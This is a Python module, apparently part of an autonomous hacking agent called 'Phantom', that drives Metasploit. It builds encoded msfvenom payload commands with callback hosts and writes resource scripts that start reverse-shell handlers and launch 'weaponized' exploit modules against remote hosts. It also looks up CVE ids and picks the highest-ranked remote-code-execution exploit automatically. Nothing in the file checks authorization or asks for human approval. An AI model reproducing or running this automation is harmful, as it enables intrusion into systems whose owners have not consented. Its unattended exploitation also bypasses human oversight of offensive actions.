"""
msf.py — Metasploit integration for the autonomous agent.

Payloads are generated with msfvenom; multi-stage sessions run under
msfconsole driven by a generated .rc resource script (never by
interactive typing). Commands are synthesized here only; actual tool
presence is checked lazily so the rest of Phantom works without MSF.
"""

from __future__ import annotations

import os
import tempfile
from typing import Optional

from phantom.automation.runtime.toolrunner import ToolMissingError, tool_runner, _require_tool
from phantom.core.executor import BackgroundProcess


_ARCH_BY_PLATFORM = {
    "windows": "x64",
    "linux": "x64",
    "macos": "x64",
    "android": "dalvik",
}

# x86 encoders never work on x64 targets — pick by arch.
_ENCODER_BY_ARCH = {
    "x64": "x64/xor",
    "x86": "x86/shikata_ga_nai",
    "dalvik": "x86/shikata_ga_nai",
}


def msfvenom_command(payload: str, lhost: str, lport: int, platform: str = "linux",
                     format: str = "elf", arch: Optional[str] = None,
                     encoder: Optional[str] = None) -> str:
    arch = arch or _ARCH_BY_PLATFORM.get(platform, "x64")
    encoder = encoder or _ENCODER_BY_ARCH.get(arch, "x64/xor")
    fmt = format
    if platform == "windows" and format == "elf":
        fmt = "exe"
    cmd = (
        f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} "
        f"-a {arch} --platform {platform} -e {encoder} -f {fmt}"
    )
    return cmd


class MsfRunner:
    """Drives msfconsole through generated resource scripts."""

    def __init__(self) -> None:
        self._scripts: list[str] = []

    def _require(self) -> str:
        return _require_tool(["msfconsole"])

    def resource_script(self, payload: str, lhost: str, lport: int,
                        exit_on_session: bool = True) -> str:
        """Write an .rc script and return its path."""
        lines = [
            f"use exploit/multi/handler",
            f"set PAYLOAD {payload}",
            f"set LHOST {lhost}",
            f"set LPORT {lport}",
            f"set ExitOnSession {'true' if exit_on_session else 'false'}",
            "run -j",
            "sleep 1",
        ]
        if exit_on_session:
            lines.append("sessions -l")
        fd, path = tempfile.mkstemp(suffix=".rc", prefix="phantom_msf_")
        with os.fdopen(fd, "w", encoding="utf-8") as f:
            f.write("\n".join(lines) + "\n")
        self._scripts.append(path)
        return path

    def spawn(self, rc_path: str) -> BackgroundProcess:
        msfconsole = self._require()
        cmd = f"{msfconsole} -q -r {rc_path}"
        return tool_runner.spawn(cmd)

    def exploit_resource_script(self, module_path: str, payload: str,
                                rhost: str, rport: int,
                                lhost: str, lport: int) -> str:
        """Write a weaponized .rc script for an exploit module and return it.

        Synthesized only — the module path comes from the CVE registry, never
        from free-form input. Auxiliary modules (no payload) use a bare 'run'.
        """
        lines = [
            f"use {module_path}",
            f"set RHOSTS {rhost}",
            f"set RPORT {rport}",
        ]
        if payload:
            lines += [
                f"set PAYLOAD {payload}",
                f"set LHOST {lhost}",
                f"set LPORT {lport}",
            ]
        lines += ["exploit -j", "sleep 1", "sessions -l"]
        fd, path = tempfile.mkstemp(suffix=".rc", prefix="phantom_msf_exploit_")
        with os.fdopen(fd, "w", encoding="utf-8") as f:
            f.write("\n".join(lines) + "\n")
        self._scripts.append(path)
        return path

    def cleanup(self) -> None:
        for path in self._scripts:
            try:
                os.remove(path)
            except OSError:
                pass
        self._scripts.clear()


_RANK_ORDER = {"excellent": 5, "great": 4, "good": 3, "normal": 2, "manual": 1}


def search_module_for_cve(cve_id: str, timeout: float = 45.0) -> Optional[str]:
    """Dynamically discover the Metasploit module for a CVE id.

    Runs `msfconsole search cve:<id>` (Metasploit ships a current,
    self-updating CVE->module index) and returns the best RCE module path
    (prefers exploit/ modules by rank), or None when the tool is missing,
    times out, or no module exists. This is what makes the CVE catalog
    genuinely dynamic: the static registry covers the curated top, the NVD
    resolver correlates the long tail, and msf search weaponizes it.

    Never raises: every failure mode degrades to None so the caller falls
    back to the bug-class path or plain enumeration.
    """
    import re
    cve_id = (cve_id or "").strip().upper()
    if not cve_id.startswith("CVE-"):
        return None
    try:
        msfconsole = _require_tool(["msfconsole"])
    except ToolMissingError:
        return None
    script = "search cve:%s; exit -y" % cve_id
    try:
        proc = tool_runner.spawn(f"{msfconsole} -q -x {script!r}")
        proc.wait(timeout=timeout)
        output = proc.stdout or ""
    except Exception:
        return None
    candidates = []
    for line in (output or "").splitlines():
        # msf table rows: "   1  exploit/multi/http/...  2024-01-24  excellent  ..."
        m = re.match(r"^\s*\d+\s+(exploit|auxiliary)/[\w/]+", line)
        if not m:
            continue
        rank = _RANK_ORDER.get("normal", 2)
        for word in line.split():
            if word in _RANK_ORDER:
                rank = _RANK_ORDER[word]
                break
        candidates.append((rank, m.group(1), line.split()[1]))
    if not candidates:
        return None
    # prefer exploit/ (RCE) modules, then highest rank
    candidates.sort(key=lambda c: (c[1] == "exploit", c[0]), reverse=True)
    return candidates[0][2]


# global instance
msf_runner = MsfRunner()
